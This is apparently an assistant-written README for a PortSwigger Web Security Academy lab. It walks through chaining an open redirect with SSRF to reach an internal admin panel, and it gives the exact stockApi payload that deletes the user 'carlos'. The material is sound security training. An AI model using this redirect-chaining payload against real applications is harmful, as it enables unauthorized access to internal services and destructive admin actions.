Absolutely Kaouthar! 🔥 Here's the **full professional README** for:

🎯 **Lab: SSRF with Filter Bypass via Open Redirection Vulnerability**

This lab is a great example of chaining two vulnerabilities: **Open Redirect** + **SSRF** to achieve internal access.

---

# README — SSRF with Filter Bypass via Open Redirection Vulnerability

---

## 🔍 Overview

This lab demonstrates how an attacker can **bypass SSRF filters** by exploiting an **open redirection vulnerability** inside the same application.

The SSRF filter restricts requests to local paths only. However, the app contains a **vulnerable endpoint** that reflects the `path` parameter into a **302 redirection**, which can be abused to redirect to an internal admin panel and delete a user.

---

## 🎯 Objective

* Bypass SSRF restrictions by abusing an internal open redirect endpoint.
* Redirect the SSRF request to the internal URL:
  `http://192.168.0.12:8080/admin/delete?username=carlos`
* Solve the lab by triggering user deletion via SSRF.

---

## 🛠️ Tools

* Burp Suite (Proxy, Repeater)
* Familiarity with open redirection and SSRF chaining

---

## 🧪 Exploitation Steps

---

### 1. ⛔ SSRF Filter Blocks External Hosts

Intercept this request in Burp:

```http
POST /product/stock HTTP/2
Host: <your-lab>.web-security-academy.net

stockApi=http://192.168.0.12:8080/admin
```

🛑 Rejected – application only allows **relative URLs**, preventing direct SSRF.

---

### 2. 🔁 Identify the Open Redirect

Navigate to the **Next Product** feature:

```http
/product/nextProduct?path=/product?productId=2
```

Observe the response:

```
HTTP/1.1 302 Found  
Location: /product?productId=2
```

✅ This reveals an **open redirect vulnerability**: the app reflects the `path` parameter in the `Location` header without sanitization.

---

### 3. 🔁 Redirect to Internal Admin Interface

Craft a relative path SSRF that **redirects to the internal service**:

```http
/product/nextProduct?path=http://192.168.0.12:8080/admin
```

Use this in the `stockApi` parameter:

```http
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
```

This SSRF **follows the redirect** to the internal admin page.

---

### 4. 💣 Final Payload to Delete Carlos

Replace the URL with the full **delete request**:

```http
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
```

📸 Screenshot placeholder:
![ssrf](https://github.com/Kabilala/ssrf/blob/main/lab5/lab5.png)

✅ If successful, the request hits the internal server and deletes the user. Lab is marked **Solved**.

---

## 📸 Screenshots

```